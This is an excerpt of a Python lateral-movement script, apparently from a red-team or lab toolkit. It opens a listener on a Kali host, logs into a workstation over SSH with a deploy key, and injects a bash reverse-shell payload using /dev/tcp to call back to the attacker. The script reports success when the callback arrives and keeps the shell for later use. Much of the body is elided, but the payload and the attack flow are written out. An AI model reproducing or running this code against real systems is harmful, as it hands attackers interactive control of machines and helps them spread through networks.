...
def setup_listener(port=DEFAULT_REVERSE_PORT, timeout=20):
    ...
    Returns:
        tuple: (server_socket, result_socket) where result_socket is the 
               reverse shell or None on timeout.
    """
    ...
    try:
        reverse_shell, addr = server.accept()
        print(f"[+] Reverse shell received from {addr[0]}")
        return server, reverse_shell
    except socket.timeout:
        print(f"[-] Timeout — no reverse shell received on port {port}.")
        return server, None


def inject_reverse_shell(workstation_ip, workstation_user, deploy_key_file, 
                         kali_host, kali_port, workstation_port=22):
    """
    ...
    """
    payload = (
        f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1'"
    )
...
def verify_ssh_connection(workstation_ip, workstation_user, deploy_key_file, 
                          workstation_port=22):
    """
...
def run(deploy_key_file, workstation_ip=WORKSTATION_IP, 
        workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT,
        kali_host=KALI_HOST, kali_port=DEFAULT_REVERSE_PORT):
    """
    ...
    server_socket, reverse_shell = setup_listener(kali_port, timeout=20)
    ...
    verification = verify_ssh_connection(workstation_ip, workstation_user, 
                                         deploy_key_file, workstation_port)
    ...
    inject_thread = threading.Thread(
        ...
        args=(workstation_ip, workstation_user, deploy_key_file, 
              kali_host, kali_port, workstation_port),
        daemon=True
    )
    inject_thread.start()
    
    # Step 5: Wait for reverse-shell callback
    if reverse_shell is not None:
        print(f"[+] Lateral movement successful!")
        result['reverse_shell'] = reverse_shell
        result['success'] = True
    else:
        print("[-] Reverse shell timeout (SSH verification succeeded, but reverse shell didn't callback)")
        result['success'] = False  # Partial failure — SSH works but reverse shell didn't
    
    # Clean up listener socket (reverse_shell is kept for later use)
    server_socket.close()
...
if __name__ == "__main__":
    ...
    if len(sys.argv) < 2:
        print("Usage: python lateral_movement.py <deploy_key_file> [workstation_ip] [kali_host]")
        sys.exit(1)
    ...
    print(f"    SSH Client: {result['ssh_client'] is not None}")
